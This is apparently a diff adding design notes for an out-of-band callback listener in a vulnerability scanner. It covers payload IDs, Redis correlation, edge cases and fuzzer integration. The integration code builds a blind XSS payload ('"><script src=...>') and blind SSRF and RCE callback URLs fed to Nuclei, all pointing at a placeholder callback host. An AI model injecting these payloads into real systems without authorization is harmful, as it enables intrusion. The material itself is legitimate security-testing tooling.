@@ -1,0 +1,196 @@
+
+---
+
+## Deep Dive Post-Mortem (DNA)
+
+### 1. Payload Generation & Correlation Flow
+
+PAYLOAD LIFECYCLE
+
+GENERATION (by fuzzer/sniper):
+┌─────────────────────────────────────────────────────┐
+│ generate_payload("task_1", "scan_42", "blind_xss") │
+│ │
+│ 1. Create unique_id = "scan_42-blind_xss-a3f2c1d0" │
+│ (scan_id + vuln_type + uuid4[:8]) │
+│ │
+│ 2. Build subdomain: │
+│ "scan_42-blind_xss-a3f2c1d0.oast.example.com" │
+│ │
+│ 3. Build URL: │
+│ "http://oast.example.com:8080/scan_42-blind_xss-a3f2c1d0" │
+│ │
+│ 4. Store in Redis: │
+│ KEY: oast:payload:scan_42-blind_xss-a3f2c1d0 │
+│ VAL: {task_id, scan_id, vuln_type, created_at} │
+│ TTL: 86400s (24h) │
+│ │
+│ 5. Return PayloadInfo to caller │
+└─────────────────────────────────────────────────────┘
+
+INJECTION (by fuzzer/sniper):
+┌─────────────────────────────────────────────────────┐
+│ Insert payload.url into HTTP parameter/header/body │
+│ e.g., <script src="http://scan_42-blind_xss-..."> │
+│ Send request to target │
+└─────────────────────────────────────────────────────┘
+
+CALLBACK (target triggers payload):
+┌─────────────────────────────────────────────────────┐
+│ Target's browser/server makes request to: │
+│ GET http://oast.example.com:8080/scan_42-blind_xss-a3f2c1d0 │
+│ │
+│ OAST HTTP Server receives it: │
+│ 1. Extract source_ip, headers, body, URL │
+│ 2. Extract unique_id via regex │
+│ 3. Build Callback object │
+│ 4. LPUSH to Redis oast:callbacks │
+│ 5. Respond 200 "ok" │
+└─────────────────────────────────────────────────────┘
+
+CORRELATION (correlator picks it up):
+┌─────────────────────────────────────────────────────┐
+│ BRPOP oast:callbacks │
+│ 1. Deserialize Callback │
+│ 2. Extract unique_id from URL │
+│ 3. Dedup check (oast:dedup:{callback_id}) │
+│ └─ If duplicate → skip │
+│ 4. Lookup oast:payload:{unique_id} │
+│ └─ If not found → log "unknown" & skip │
+│ 5. Check payload TTL │
+│ └─ If expired → log "expired" & skip │
+│ 6. Build OASTFinding │
+│ 7. Build TaskResult (status="COMPLETED", data={...}) │
+│ 8. LPUSH to results:incoming │
+└─────────────────────────────────────────────────────┘
+
+text
+
+
+### 2. Edge Cases Mitigated — Detailed Table
+
+| # | Edge Case | Detection | Mitigation | Code Location |
+|---|-----------|-----------|------------|---------------|
+| 1 | Callback with expired payload TTL | `PayloadInfo.is_expired()` checks elapsed time vs TTL | Log "expired" + increment stats counter + discard | `correlator.py:_process_callback` |
+| 2 | Duplicate callbacks (same payload triggered N times) | Redis `SET NX` on `oast:dedup:{callback_id}` returns None if exists | Skip processing, increment `duplicates` counter | `correlator.py:_is_duplicate_v2` |
+| 3 | Malformed callback URL (no pattern match) | `extract_unique_id()` regex returns None | Log + increment `unknown` counter + discard | `correlator.py:_process_callback` |
+| 4 | Server overload | FastAPI async handles concurrency; Redis queue decouples receipt from processing | Correlator processes in configurable batches; backpressure via queue depth | `server.py:catch_all`, `correlator.py:_pop_callbacks` |
+| 5 | Redis connection lost (server side) | `RedisConnection.is_connected` ping check; push returns False | Log warning; callback logged to stdout but not persisted (accepted loss) | `server.py:RedisConnection.push_callback` |
+| 6 | Redis connection lost (correlator side) | Exception in `_pop_callbacks` or `_process_callback` | Reconnect attempt each cycle; sleep between retries; max_retries before exit | `correlator.py:run` |
+| 7 | DNS server fails to start (permissions) | `PermissionError` caught in `_start_dns_server` | Log error; HTTP server continues independently | `server.py:_start_dns_server` |
+| 8 | Payload generation collision | UUID4 hex[:8] + scan_id + vuln_type virtually eliminates collisions | Redis SET with TTL is atomic; if collision somehow occurs, later payload overwrites (acceptable for security) | `correlator.py:generate_payload` |
+| 9 | Large request body (DoS) | Body truncated to `max_body_size` (configurable, default 10KB) | `Callback.truncate_body()` + async read timeout | `server.py:catch_all`, `models.py:truncate_body` |
+| 10 | SIGTERM during batch processing | Signal handler sets `_running = False` / `_shutdown_event` | Current callback finishes; loop exits cleanly; final stats logged | `server.py:_signal_handler`, `correlator.py:run` |
+| 11 | Callback JSON parse failure | `Callback.from_json` catches `JSONDecodeError` | Returns Callback with type=UNKNOWN and raw data preserved | `models.py:Callback.from_json` |
+| 12 | Config file missing | `cfg_path.exists()` check | Use hardcoded defaults; log warning | `server.py:load_config` |
+| 13 | shared.logger unavailable | `ImportError` caught | Falls back to stdlib logging with JSON formatter | All files |
+| 14 | shared.schemas unavailable | `ImportError` caught | Local stub classes for TaskStatus, Task, TaskResult | `correlator.py` |
+
+### 3. Remaining Loopholes & Future Improvements
+
+| # | Item | Description | Priority |
+|---|------|-------------|----------|
+| 1 | **Interactsh integration** | Replace custom DNS server with Interactsh client binary for proper authoritative DNS, wildcard subdomains, and encrypted polling | HIGH |
+| 2 | **DNS over TLS / HTTPS** | Current DNS is plain UDP; should support DoT (port 853) and DoH for environments that block plain DNS | MEDIUM |
+| 3 | **Webhook notifications** | Push findings to Slack/Discord/PagerDuty webhook in addition to Redis | MEDIUM |
+| 4 | **Persistent storage** | Callbacks and findings should also be written to PostgreSQL/MongoDB for long-term forensics | MEDIUM |
+| 5 | **Rate limiting** | Callback endpoint has no rate limiter; a DDoS could fill Redis | HIGH |
+| 6 | **mTLS for callback** | Authenticate callbacks using mutual TLS to prevent spoofing | LOW |
+| 7 | **IPv6 support** | DNS resolver only returns A records; should also handle AAAA | LOW |
+| 8 | **Payload encryption** | unique_id is plaintext in URL; an attacker could enumerate. Encrypt or HMAC-sign the identifier | MEDIUM |
+| 9 | **Callback replay protection** | Beyond dedup, implement nonce-based anti-replay | LOW |
+| 10 | **Distributed correlator** | Run multiple correlator instances with Redis Streams (consumer groups) instead of lists | HIGH (scale) |
+| 11 | **Metrics export** | Expose Prometheus metrics from correlator (callbacks/sec, queue depth, findings) | MEDIUM |
+
+### 4. Performance Considerations
+
+| Aspect | Current Design | Scalability Notes |
+|--------|---------------|-------------------|
+| **HTTP throughput** | FastAPI async + uvicorn; single process handles ~10k req/s | Add workers via `--workers N` or deploy behind nginx/HAProxy |
+| **Redis writes** | LPUSH per callback (~0.1ms each) | Redis handles 100k+ ops/s; not a bottleneck |
+| **Correlator throughput** | Batch BRPOP (up to 10 per cycle); sequential processing | For higher throughput, use Redis Streams with consumer groups; run N correlator instances |
+| **Memory** | Callbacks truncated to 10KB body; dedup keys expire after 48h | Monitor Redis memory; set `maxmemory-policy allkeys-lru` |
+| **DNS** | dnslib threaded UDP server; adequate for OAST volumes | For production DNS, use Interactsh or CoreDNS with custom plugin |
+| **Payload storage** | Redis keys with TTL (24h default) | No concern at typical VAPT scale (thousands of payloads) |
+
+### 5. Integration Notes for Fuzzer / Sniper
+
+```python
+# ── In modules/fuzzer/smart_fuzzer.py ──────────────────────────
+
+from modules.oast_listener import generate_payload
+
+class SmartFuzzer:
+    def fuzz_parameter(self, url: str, param: str, task_id: str, scan_id: str):
+        # Generate blind XSS payload
+        oast = generate_payload(
+            task_id=task_id,
+            scan_id=scan_id,
+            vuln_type="blind_xss",
+        )
+        
+        # Inject into parameter
+        blind_xss_payload = f'"><script src="{oast.url}"></script>'
+        
+        # Also generate blind SSRF payload
+        oast_ssrf = generate_payload(
+            task_id=task_id,
+            scan_id=scan_id,
+            vuln_type="blind_ssrf",
+        )
+        blind_ssrf_payload = oast_ssrf.url
+        
+        # Send requests with these payloads
+        # ... (existing fuzzing logic)
+        
+        # The OAST correlator will automatically detect callbacks
+        # and push findings to results:incoming
+
+Python
+
+# ── In modules/sniper/nuclei_sniper.py ─────────────────────────
+
+from modules.oast_listener import generate_payload
+
+class NucleiSniper:
+    def run_blind_templates(self, target: str, task_id: str, scan_id: str):
+        oast = generate_payload(
+            task_id=task_id,
+            scan_id=scan_id,
+            vuln_type="blind_rce",
+        )
+        
+        # Pass OAST URL to Nuclei as interactsh-url override
+        # nuclei -u target -t blind/ -iurl oast.url
+        cmd = [
+            "nuclei", "-u", target,
+            "-t", "blind/",
+            "-iurl", oast.url,
+        ]
+        # ... execute
+
+6. Testing
+
+Bash
+
+# Terminal 1: Start OAST server
+OAST_REDIS_HOST=localhost OAST_HTTP_PORT=9999 python -m modules.oast_listener.server
+
+# Terminal 2: Start correlator
+OAST_REDIS_HOST=localhost python -m modules.oast_listener.correlator
+
+# Terminal 3: Register a payload and simulate a callback
+python -c "
+from modules.oast_listener import generate_payload
+p = generate_payload('task1', 'scan1', 'blind_xss')
+print(f'Callback URL: {p.url}')
+print(f'Test with: curl {p.url}')
+"
+
+# Terminal 3: Trigger the callback
+curl http://localhost:9999/scan1-blind_xss-<unique_hex>
+
+# Check Redis for results
+redis-cli LRANGE results:incoming 0 -1
+
+This module is independently runnable, communicates only via Redis queues, supports graceful SIGTERM shutdown, uses JSON-formatted logging, emits UPPERCASE status strings, and includes the mandatory data field in all results. It is fully plug-and-play with the Centaur-Jarvis architecture.
